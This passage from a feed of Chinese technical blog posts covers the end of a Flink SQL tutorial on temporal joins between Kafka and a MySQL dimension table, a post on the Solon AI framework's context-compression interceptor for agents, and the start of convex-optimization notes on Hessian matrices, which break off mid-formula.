这是一张以 <code>user_id</code> 为主键的表，是做时态 Join 的前提</li>\n<li>这里使用的是典型的 JDBC Lookup 模式，Flink 会在 Join 时按需去 MySQL 查维度信息</li>\n</ul>\n<p>在生产环境中，你可以把 MySQL 作为维度存储，或者通过 CDC 把维表变更同步到 Kafka，构造成 changelog 流，这些都可以和 Temporal Join 结合使用。</p>\n<h2 id=\"五维表时态-join把订单打上用户维度\">五、维表时态 Join：把订单打上用户维度</h2>\n<p>有了订单事实表 <code>orders</code> 和维度表 <code>dim_user</code>，就可以通过时态 Join 来构建订单明细宽表。</p>\n<h3 id=\"1-基础时态-join-语法\">1. 基础时态 Join 语法</h3>\n<p>Flink SQL 中的 Temporal Table Join 对于 JDBC 这类 <strong>外部维表</strong>，通常采用「处理时间（Processing Time）」语义来做 Lookup Join，典型写法如下：</p>\n<pre><code class=\"language-sql\">SELECT\n  o.order_id,\n  o.user_id,\n  d.user_name,\n  d.user_level,\n  d.city,\n  o.order_amount,\n  o.order_time\nFROM orders AS o\nLEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d\nON o.user_id = d.user_id;\n</code></pre>\n<p><img alt=\"FlinkJoin\" class=\"lazyload\" /><br />\n这里有几个关键点：</p>\n<ul>\n<li><code>proc_time AS PROCTIME()</code> 是在 <code>orders</code> 上定义的处理时间字段</li>\n<li><code>FOR SYSTEM_TIME AS OF o.proc_time</code> 表示“以 Flink 处理这条订单记录的当前时间，去查维表的一个快照”，这是 JDBC Lookup 支持的典型用法</li>\n<li>Join 条件依然是 <code>user_id</code> 等值关联</li>\n<li>使用 <code>LEFT JOIN</code> 可以保留找不到维度的订单，并用空值来表示“维度缺失”</li>\n</ul>\n<p>在 SQL Client 中执行这段查询，会看到实时流式刷新的结果，每一行订单都带上了对应的用户属性。</p>\n<h3 id=\"2-验证时态效果修改维表再观察-join\">2. 验证时态效果：修改维表再观察 Join</h3>\n<p>为了验证这是“时态 Join”而不是“始终查最新维度”，可以按下面步骤操作：</p>\n<ol>\n<li>\n<p>先往 Kafka 的 <code>orders</code> Topic 写入几条订单数据，例如用户 <code>u_2</code> 下单的记录</p>\n</li>\n<li>\n<p>观察 Flink SQL 中 Join 后的结果，此时 <code>u_2</code> 的等级是 <code>VIP2</code></p>\n</li>\n<li>\n<p>回到 MySQL，执行：</p>\n<pre><code class=\"language-sql\">UPDATE dim_user\nSET user_level = 'VIP3'\nWHERE user_id = 'u_2';\n</code></pre>\n</li>\n<li>\n<p>再写入一批新的订单，仍然是用户 <code>u_2</code></p>\n</li>\n</ol>\n<pre><code class=\"language-bash\">bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic orders\n</code></pre>\n<p>在命令行中输入一条 JSON 数据（按回车发送一条）：</p>\n<pre><code class=\"language-json\">{\"order_id\":\"o_3\",\"user_id\":\"u_2\",\"order_amount\":200.00,\"order_time\":\"2026-02-19T14:42:00Z\"}\n</code></pre>\n<p><img alt=\"FlinkJoin\" class=\"lazyload\" /><br />\n这时你会看到：</p>\n<ul>\n<li>变更前的订单，维度字段仍然显示 <code>VIP2</code></li>\n<li>变更后的订单，维度字段变成了 <code>VIP3</code></li>\n</ul>\n<p>这就说明 Flink 的时态 Join 确实是“按订单发生时刻去回放维度视图”的，而不是简单查当前最新值。</p>\n<h2 id=\"六把结果写回-kafka-或-mysql形成实时数仓明细层\">六、把结果写回 Kafka 或 MySQL，形成实时数仓明细层</h2>\n<p>在真实项目中，我们不会只在 SQL Client 里 <code>SELECT</code> 一下就结束，而是要把 Join 后的订单明细宽表，写回到下游存储，形成实时数仓的一个层级。</p>\n<p>例如，可以把结果写回 Kafka，作为 DWD 层的订单宽表：</p>\n<pre><code class=\"language-sql\">CREATE TABLE dwd_order_user_wide (\n  order_id     STRING,\n  user_id      STRING,\n  user_name    STRING,\n  user_level   STRING,\n  city         STRING,\n  order_amount DECIMAL(10, 2),\n  order_time   TIMESTAMP_LTZ(3),\n  WATERMARK FOR order_time AS order_time - INTERVAL '5' SECOND\n) WITH (\n  'connector' = 'kafka',\n  'topic' = 'dwd_order_user_wide',\n  'properties.bootstrap.servers' = '127.0.0.1:9092',\n  'properties.group.id' = 'flink-dwd-order-wide',\n  'scan.startup.mode' = 'earliest-offset',\n  'format' = 'json',\n  'json.timestamp-format.standard' = 'ISO-8601'\n);\n\nINSERT INTO dwd_order_user_wide\nSELECT\n  o.order_id,\n  o.user_id,\n  d.user_name,\n  d.user_level,\n  d.city,\n  o.order_amount,\n  o.order_time\nFROM orders AS o\nLEFT JOIN dim_user FOR SYSTEM_TIME AS OF o.proc_time AS d\nON o.user_id = d.user_id;\n</code></pre>\n<p>这样，下游的实时应用或 BI 查询就可以直接订阅 <code>dwd_order_user_wide</code> 这个 Topic，拿到已经打好用户标签的订单明细数据。</p>\n<p>你也可以把结果同步到 MySQL、ClickHouse 等分析型数据库中，构建实时明细表，为报表和可视化提供数据。</p>\n<h2 id=\"七小结与下一步建议\">七、小结与下一步建议</h2>\n<p>通过这篇文章，我们完成了这样一件事：</p>\n<ul>\n<li>在 Kafka 中维护订单事实流 <code>orders</code></li>\n<li>在 MySQL 中维护用户维度表 <code>dim_user</code></li>\n<li>使用 Flink SQL 的 JDBC Connector 把 MySQL 注册为维表</li>\n<li>利用 <code>FOR SYSTEM_TIME AS OF</code> 语法做维表时态 Join</li>\n<li>将 Join 结果写回 Kafka，形成实时数仓中的一张订单明细宽表</li>\n</ul>\n<p>这背后有几个非常重要的实时数仓设计理念：</p>\n<ul>\n<li>事实流是不断追加的事件序列，维表是相对缓慢变更的业务视图</li>\n<li>时态 Join 让你能够“按事件发生的时间点”，回看当时的维度快照</li>\n<li>实时数仓的 DWD 层，往往就是「事实表 + 多个维表时态 Join」后形成的明细宽表</li>\n</ul>\n<p>在后续的文章中，我们可以继续沿着这个方向深入：</p>\n<ul>\n<li>在一个任务里同时关联多张维表，构建更宽的明细表</li>\n<li>引入 CDC，把维表变更实时同步到 Kafka，再在 Flink 中构建 changelog 维表</li>\n<li>把实时数仓的明细层、汇总层（DWS）、指标主题层（ADS）串起来，做一个端到端的实时数仓小项目</li>\n</ul>\n<p>如果你已经跑通了本文的 Demo，不妨试着自己设计一张商品维表 <code>dim_product</code>，再给订单打上商品品类维度，体验一下“事实 + 多维表时态 Join”在 Flink SQL 里的完整味道。</p>\n<hr />\n<p><a href=\"http://blog.daimajiangxin.com.cn\" rel=\"noopener nofollow\" target=\"_blank\">原文来自:http://blog.daimajiangxin.com.cn</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 12:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/daimajiangxin\">代码匠心</a>&nbsp;\n阅读(<span id=\"post_view_count\">13</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "赋予 AI Agent “无限续航”：语义保护型上下文压缩技术解析",
      "link": "https://www.cnblogs.com/noear/p/19624614",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/noear/p/19624614\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 12:21\">\n    <span>赋予 AI Agent “无限续航”：语义保护型上下文压缩技术解析</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        Solon AI框架的SummarizationInterceptor创新性地解决了AI长对话中的\"上下文窗口爆炸\"问题。这套智能记忆管理系统通过四步策略：锁定核心任务指令、确保行动-结果完整性、保持语义连贯性、添加系统提示，实现了优雅的记忆压缩。其采用插件式设计，支持层级压缩、关键信息提取和向量库归档等策略组合，让AI既能记住核心目标，又能处理超长任务。这种\"有逻辑地遗忘\"机制，有效避免了传统粗暴裁剪导致的逻辑混乱，为AI处理复杂任务提供了\"无限续航\"\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>想象一下，你正在指挥一个超级聪明的AI助手（我们称之为Agent）帮你完成一项复杂任务，比如策划一次跨国旅行。一开始，它记得你的所有要求：想去哪些国家、预算多少、喜欢什么类型的酒店。但随着任务的进行，它需要查询航班、比较酒店、查看天气……每一次查询和思考都会增加它的“记忆负担”。</p>\n<p>如果它“记性”不好，聊到一半就会忘了最开始的要求，或者陷入混乱的逻辑中，这就是开发者常说的“上下文窗口爆炸”问题。</p>\n<p>Solon AI 框架里有一个秘密武器——<code>SummarizationInterceptor</code>（智能记忆压缩器），它能让AI助手像人一样，<strong>既不会忘记初心，又能轻装上阵，实现真正的“无限续航”</strong>。它不是简单粗暴地“断片”，而是一套优雅的“记忆管理大师”。</p>\n<h3 id=\"1为什么不能简单粗暴地断片\">1、为什么不能简单粗暴地“断片”？</h3>\n<p>处理长对话，最直接的想法是：对话太长？那就删掉前面一半吧！但这种“暴力裁剪”对AI来说，会带来两个致命伤：</p>\n<ul>\n<li><strong>忘本（失去初心）：</strong> AI Agent 最开头的系统设定和你交给它的第一个任务，如果被删掉，它就会像无头苍蝇一样，完全不知道自己要干嘛了。</li>\n<li><strong>断片（逻辑断层）：</strong> AI Agent 的工作模式通常是“思考 -&gt; 行动 -&gt; 观察结果”（ReAct）。如果你恰好把它的某个“行动”和对应的“观察结果”给拆散了，它看到结果却不知道为什么会有这个结果，逻辑瞬间混乱，甚至陷入死循环，无法自拔。</li>\n</ul>\n<p>所以，忘记也是一门艺术，需要有策略地忘记。</p>\n<h3 id=\"2智能记忆压缩器是如何工作的\">2、智能记忆压缩器是如何工作的？</h3>\n<p><code>SummarizationInterceptor</code> 就像一个聪明的图书管理员，它不会随意丢弃书籍，而是按照一套精密的流程来整理书架。它的工作分为四步：</p>\n<h4 id=\"第一步锁死初心锚点锁定\">第一步：锁死“初心”（锚点锁定）</h4>\n<p>无论后面的对话有多长，管理员都会第一时间找到两样东西并永久保留：</p>\n<ul>\n<li><strong>任务指令：</strong> 你第一次给AI布置的任务（UserMessage），这是它的“初心”。</li>\n<li><strong>基本守则：</strong> AI的系统设定（SystemMessage），这是它的“行为准则”。</li>\n</ul>\n<p>这两样东西被牢牢锁定，确保AI永不迷失方向。</p>\n<h4 id=\"第二步禁止断片原子对齐\">第二步：禁止“断片”（原子对齐）</h4>\n<p>这是整个机制最核心的“黑科技”。当管理员决定要清理一部分旧内容时，他不会直接动手。他会仔细检查，确保永远不会把 <strong>“行动”</strong> 和 <strong>“结果”</strong> 这对“连体婴儿”给拆散。</p>\n<ul>\n<li><strong>智能检查：</strong> 如果发现准备清理的起点正好落在一个“观察结果”（<code>ToolMessage</code>）或者一个“行动指令”（<code>AssistantMessage</code>）上，管理员会立刻把清理起点向后挪，直到确保每一对“行动-结果”都完整地保留下来。</li>\n</ul>\n<h4 id=\"第三步让记忆更连贯语义补齐\">第三步：让记忆更连贯（语义补齐）</h4>\n<p>为了让你和AI的对话读起来更通顺，管理员还会再多做一步“人情味”的检查。如果清理后的第一条记录是一个“行动结果”，管理员会看看它前面是不是紧跟着一条AI的“思考过程”（Thought）。如果是，他会把这条“思考”也一并留下。这样一来，AI看到的历史永远是从一个思考片段开始的，理解起来更自然。</p>\n<h4 id=\"第四步贴个便利贴提醒断裂感知\">第四步：贴个“便利贴”提醒（断裂感知）</h4>\n<p>在永久保存的“初心”和压缩后的“最近记忆”之间，管理员会贴上一张醒目的 <strong>“小贴士”</strong>：</p>\n<pre><code>--- [系统提示：中间部分历史对话已优化压缩，请根据当前计划和剩余历史继续任务...] ---\n</code></pre>\n<p>这张“小贴士”非常重要，它用AI能理解的语言告诉它：“别担心，中间有些细节我帮你精简了，你专注眼前的任务和核心目标就好。”这能有效防止AI因为记忆断层而产生困惑和幻觉。</p>\n<h3 id=\"3如何实现无限续航\">3、如何实现“无限续航”？</h3>\n<p>通过这套“记忆管理术”，SummarizationInterceptor 把AI的内存变成了一个动态的“新陈代谢系统”：</p>\n<ul>\n<li><strong>内存恒定：</strong> 无论AI运行了10步还是1000步，它一次“思考”所需要处理的信息量（Token数）始终维持在一个安全的范围内。</li>\n<li><strong>逻辑清晰：</strong> 因为“原子对齐”机制，AI看到的每一段记忆都是完整的“思考-行动-反馈”闭环，逻辑链条非常稳固。</li>\n<li><strong>目标永存：</strong> “系统设定”和“用户任务”这两大核心目标永远在线，AI永远不会忘记“我是谁”和“我要去哪”。</li>\n</ul>\n<h3 id=\"4更强大的组合插件式的记忆策略\">4、更强大的组合：插件式的记忆策略</h3>\n<p>这个“记忆管理器”最妙的地方在于，它采用了 <strong>策略模式</strong>，就像手机可以安装不同的APP来扩展功能一样，你可以给它接入不同的“记忆处理插件”。框架已经为我们准备了几款强大的插件：</p>\n<ul>\n<li><strong>层级压缩器：</strong> 它会像滚雪球一样，把旧的记忆摘要和新的对话历史不断融合、压缩，生成一个始终更新的“全局进度摘要”，让记忆像洋葱一样层层包裹，永不丢失核心。</li>\n<li><strong>关键信息提取器：</strong> 它像一个信息审计员，只从对话中提取最核心的“干货”，比如用户要求、获取到的数据、已经失败的尝试等，过滤掉那些啰嗦的思考过程。</li>\n<li><strong>向量库记忆师：</strong> 它会将被清理的详细对话“归档”到一个巨大的知识库里（向量数据库）。当AI需要回忆某个细节时，可以通过一个专门的“召回历史”工具，像用搜索引擎一样把它找回来。</li>\n</ul>\n<p>你可以把这些插件组合起来使用，比如先归档，再提纯，最后压缩，打造一个最适合你AI助手的记忆管理方案。</p>\n<p>应用示例：</p>\n<pre><code class=\"language-java\">import org.noear.solon.ai.agent.react.ReActAgent;\nimport org.noear.solon.ai.agent.react.intercept.SummarizationInterceptor;\nimport org.noear.solon.ai.agent.react.intercept.summarize.*;\nimport org.noear.solon.ai.agent.session.InMemoryAgentSession;\nimport org.noear.solon.ai.chat.ChatModel;\n\nCompositeSummarizationStrategy compositeStrategy = new CompositeSummarizationStrategy();\ncompositeStrategy.addStrategy(new KeyInfoExtractionStrategy(chatModel));\ncompositeStrategy.addStrategy(new HierarchicalSummarizationStrategy(chatModel));\nSummarizationInterceptor summarizationInterceptor = new SummarizationInterceptor(12, compositeStrategy);\n\nReActAgent agent = ReActAgent.of(chatModel)\n        .defaultInterceptorAdd(summarizationInterceptor)\n        .build();\n</code></pre>\n<h3 id=\"5总结\">5、总结</h3>\n<p><code>SummarizationInterceptor</code> 的设计哲学是：<strong>有尊严地裁剪，有逻辑地遗忘</strong>。</p>\n<p>它不仅仅是一个节省计算资源的工具，更是AI能够保持逻辑连贯、处理超长复杂任务的“护航者”。有了它，开发者可以放心地让AI助手去处理那些需要几个小时甚至几天才能完成的、真正复杂和智能化的工作，而不用担心它会中途“失忆”或“精神错乱”。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-19 12:21</span>&nbsp;\n<a href=\"https://www.cnblogs.com/noear\">带刺的坐椅</a>&nbsp;\n阅读(<span id=\"post_view_count\">8</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "凸优化数学基础笔记（四）：Hessian 矩阵及 Taylor 展开",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19624189",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19624189\" id=\"cb_post_title_url\" title=\"发布于 2026-02-19 09:48\">\n    <span>凸优化数学基础笔记（四）：Hessian 矩阵及 Taylor 展开</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        上一节说过，梯度 $\\nabla f(\\mathbf{X})$ 是$f(\\mathbf{X})$ 关于$\\mathbf{X}$ 的一阶导数，现在一个问题$f(\\mathbf{X})$ 关于 $\\mathbf{X}$ 的二阶导数是什么？Hessian 矩阵（海森矩阵）是一个多变量实值函数$f(\\mathbf{X})$的二阶导数构成得方阵，其几何意义是描述了一个多元函数或场函数的局部曲率。在机器学习、优化问题和物理反演问题中，Hessian矩阵扮演着重要的角色，尤其是在寻找函数的极值点（如损失函数或目标函数的最小值）和分析系统的稳定性。\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1hessian矩阵定义及性质\">1.Hessian矩阵定义及性质</h2>\n<p>​\t在上一节说过，梯度 <span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> 是<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 关于<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的一阶导数，现在一个问题<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 关于 <span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的二阶导数是什么？Hessian 矩阵（海森矩阵）是一个多变量实值函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span>的二阶导数构成得方阵，其几何意义是描述了一个多元函数或场函数的局部曲率。在机器学习、优化问题和物理反演问题中，Hessian矩阵扮演着重要的角色，尤其是在寻找函数的极值点（如损失函数或目标函数的最小值）和分析系统的稳定性。下面是关于Hessian矩阵的详细介绍：</p>\n<p>​\t<strong>Definition 4.1.1</strong>  设<span class=\"math inline\">\\(f:\\mathbb{R}^n\\rightarrow{\\mathbb{R}}\\)</span> , <span class=\"math inline\">\\(\\mathbf{X}\\in{R}^n\\)</span> ,如果<span class=\"math inline\">\\(f\\)</span>在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处对于自变量<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的各个分量<span class=\"math inline\">\\(x_i,x_j\\)</span> 的二阶偏导</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part{f(\\mathbf{X}_0)}}{\\part{x_i}\\part{x_j}} \t\t\\hspace{2em} (i,j=1,2,...,n)\n\\]</div><p></p><p>都存在，则称函数<span class=\"math inline\">\\(f\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处二阶可导，并且称矩阵：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X}_0)=\\left(\\begin{matrix}\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1^2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_n}}\\\\ \n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_1}\\part{x_2}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2^2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_2}\\part{x_n}}\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_1}},&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}\\part{x_2}},&amp;\\cdots,&amp;\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_n}^2}\n\\end{matrix}\\right)\n\\tag{2}\n\\]</div><p></p><p>是<span class=\"math inline\">\\(f\\)</span>在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处的<strong>Hessian矩阵</strong>，记为<span class=\"math inline\">\\(\\mathbf{H}_{ij}=\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}\\)</span>。</p>\n<p>​\t在数学分析中已经知道，当<span class=\"math inline\">\\(f\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处的所有二阶偏导数为连续时有：</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2f(\\mathbf{X}_0)}{\\part{x_i}\\part{x_j}}=\\frac{\\part^2{f(\\mathbf{X}_0)}}{\\part{x_j}\\part{x_i}} \\tag{3}\n\\]</div><p></p><p>因此，在这种情况下Hessian矩阵是<strong>对称矩阵</strong>。</p>\n<p><strong>推论 1</strong> 设<span class=\"math inline\">\\(\\mathbf{a}\\in{\\mathbf{R}^n},\\mathbf{X}\\in{\\mathbf{R}^n},b\\in{R}\\)</span>，求线性函数：</p>\n<p></p><div class=\"math display\">\\[f(\\mathbf{X})=\\mathbf{a}^T\\mathbf{X}+b\\tag{4}\n\\]</div><p></p><p>在任意点<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 处的梯度向量和Hessian矩阵：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f(\\mathbf{X})}=\\mathbf{a}\\\\\n&amp;\\nabla^2{f(\\mathbf{X})}=\\mathbf{0}\n\\end{aligned}\n\\tag{5}\n\\]</div><p></p><p><strong>证  明：</strong> 设<span class=\"math inline\">\\(\\mathbf{a}=[a_1,a_2,\\cdots,a_n]^{T},\\mathbf{X}=[x_1,x_2,\\cdots,x_n]^{T}\\)</span> 则：</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\sum^{n}_{i=1}a_ix_i+b \\tag{6}\n\\]</div><p></p><p>根据梯度向量<span class=\"math inline\">\\(\\nabla{f}\\)</span>的定义：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\frac{\\part{f}}{\\part{x_i}}=a_i \\hspace{2em} (i=1,2,\\cdots,n) \\tag{7}\n\\]</div><p></p><p>由式（7）可知，</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=[a_1,a_2,\\cdots,a_n]^T=\\mathbf{a} \\tag{8}\n\\]</div><p></p><p>根据式（2）的<span class=\"math inline\">\\(Hessian\\)</span>矩阵的定义：</p>\n<p></p><div class=\"math display\">\\[\\frac{\\part^2{f}}{\\part{x_i}\\part{x_j}}=0, \\hspace{2em} i,j=1,2,\\cdots,n \\tag{9}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2{f(\\mathbf{X})}=\\mathbf{0} \\tag{10}\n\\]</div><p></p><p><strong>推论  2</strong>  设<span class=\"math inline\">\\(\\mathbf{A}\\in{R^{n\\times{n}}}\\)</span> 是对称实方阵，<span class=\"math inline\">\\(\\mathbf{b}\\in{\\mathbf{R}^n},c\\in\\mathbf{R}^1\\)</span> ,其二次函数<span class=\"math inline\">\\(f(\\mathbf{X})=\\frac{1}{2}\\mathbf{X}^T\\mathbf{A}\\mathbf{X}+\\mathbf{b}^T\\mathbf{X}+c\\)</span> ,在任意点处的梯度向量<span class=\"math inline\">\\(\\nabla{f(\\mathbf{X})}\\)</span> 及Hessian矩阵 <span class=\"math inline\">\\(\\nabla^2f(\\mathbf{X})\\)</span> 为如下形式：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n&amp;\\nabla{f}=\\mathbf{AX+b} \\\\\n&amp;\\nabla^2{f}=\\mathbf{A}\n\\end{aligned}\n\\tag{11}\n\\]</div><p></p><p><strong>证 明：</strong> 设<span class=\"math inline\">\\(\\mathbf{A}=[a_{ij}]_{n\\times{n}}\\)</span> ,<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,...,x_n]^T\\)</span>, <span class=\"math inline\">\\(\\mathbf{b}=[b_1,b_2,...,b_n]^T\\)</span> ,二次函数<span class=\"math inline\">\\(f(\\mathbf{X})\\)</span> 可以写成如下形式：</p>\n<p></p><div class=\"math display\">\\[f(x_1,x_2,\\cdots,x_n)=\\frac{1}{2}\\sum_{i=1}^{n}\\sum_{j=1}^{n}a_{ij}x_ix_j+\\sum_{i=1}^{n}b_ix_i+c \\tag{12}\n\\]</div><p></p><p>将它对各个变量 <span class=\"math inline\">\\(x_i\\)</span> (<span class=\"math inline\">\\(i=1,\\cdots,n\\)</span>) 求偏导数，得到：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left( \\begin{matrix} \\sum_{j=1}^n a_{1j}x_j+b_1\\\\\n\\vdots \\\\\\sum_{j=1}^{n}a_{n_j}x_j+b_n \\end{matrix} \\right)= \\left(\\begin{matrix}\\sum_{j=1}^{n}a_{1j}x_j\\\\\\vdots\\\\\\sum_{j=1}^na_{nj}x_j\\end{matrix}\\right)+\\left(\\begin{matrix}b_1\\\\ \\vdots \\\\b_n\\end{matrix}\\right) \\tag{13}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\mathbf{AX+b} \\tag{14}\n\\]</div><p></p><p>再对它们的求偏导数是：</p>\n<p></p><div class=\"math display\">\\[ \\frac{\\part{f(\\mathbf{X})}}{\\part{x_i}\\part{x_j}}=a_{ij} \\tag{15}\n\\]</div><p></p><p>所以：</p>\n<p></p><div class=\"math display\">\\[\\nabla^2f(\\mathbf{X})=\\mathbf{A} \\tag{16}\n\\]</div><p></p><p>以上两个例子说明，<span class=\"math inline\">\\(n\\)</span>元函数求导与一元函数求导在形式上一致的，即线性函数的一阶导数的求导为常向量，其二阶导数为零矩阵；而二次函数的一阶导数为线性向量函数， 其二阶导数为常矩阵。</p>\n<p>​\t在此介绍在今后的计算中要用到的向量函数的导数。</p>\n<p>​\t<strong>Definition 4.1.2</strong> 设一个向量函数<span class=\"math inline\">\\(h:R^{n}\\rightarrow{R^m}，\\mathbf{X}_0\\in{R^n}\\)</span>，记<span class=\"math inline\">\\(h(\\mathbf{X})=\\{h_1(\\mathbf{X}),h_2(\\mathbf{X}),\\cdots,h_m(\\mathbf{X})\\}^T\\)</span>，如果<span class=\"math inline\">\\(h_i(i=1,2,\\cdots,m)\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处对于自变量<span class=\"math inline\">\\(\\mathbf{X}=[x_1,x_2,x_3,\\cdots,x_n]^T\\)</span> 的各分量的偏导数<span class=\"math inline\">\\(\\frac{\\part{h_i(\\mathbf{X}_0)}}{\\part{x_j}}\\space(j=1,2,3,\\cdots,m)\\)</span> 都存在，则称向量函数<span class=\"math inline\">\\(h(\\mathbf{X})\\)</span> 在点<span class=\"math inline\">\\(\\mathbf{X}_0\\)</span> 处是一阶可导的，并且称矩阵：</p>\n<p></p><div class=\"math display\">\\[\\nabla_{m\\times{n}}h(\\mathbf{X}_0)=\\left[\\begin{matrix} \\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_1(\\mathbf{X}_0)}}{\\part{x_n}} \\\\ \\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_1}} &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}}\\\\ \\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\ \\frac{\\part{h_m(\\mathbf{X}_0)}}{\\part{x_1}}   &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_2}} &amp;\\cdots &amp;\\frac{\\part{h_2(\\mathbf{X}_0)}}{\\part{x_n}} \\end{matrix}\\right] \\tag{17}\n\\]</div><p></p><p>是<span class=\"math inline\">\\(h\\)</span>在点<span class=\"math inline\">\\(X_0\\)</span> 处的一阶导数或Jacobi 矩阵，简记为</p>\n<p></p><div class=\"math display\">\\[\\nabla{\\mathbf{h}(\\mathbf{X}_0)}=\\nabla_{m\\times{n}}\\mathbf{h}(\\mathbf{X}_0) \\tag{18}\n\\]</div><p></p><p>由于<span class=\"math inline\">\\(n\\)</span>元函数<span class=\"math inline\">\\(f:\\mathbf{R}^n\\rightarrow \\mathbf{R}^1\\)</span> 的梯度是向量函数:</p>\n<p></p><div class=\"math display\">\\[\\nabla{f(\\mathbf{X})}=\\left[\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}},...,\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right]^T \n\\tag{19}\n\\]</div><p></p><p>所以<span class=\"math inline\">\\(\\nabla f(\\mathbf{X})\\)</span> 的一阶导数或Jacobi 矩阵为：</p>\n<p></p><div class=\"math display\">\\[\\begin{aligned}\n\\nabla_{n\\times{n}}\\nabla{f(\\mathbf{X})}&amp;=\\left[\\begin{matrix}\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_1}}\\right)\\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right) &amp;\\cdots &amp;\\frac{\\part}{\\part{x_n}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_2}}\\right)\\\\\n\\cdots &amp;\\cdots &amp;\\cdots &amp;\\cdots \\\\\n\\frac{\\part}{\\part{x_1}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\frac{\\part}{\\part{x_2}}\\left(\\frac{\\part{f(\\mathbf{X})}}{\\part{x_n}}\\right) &amp;\\cdots 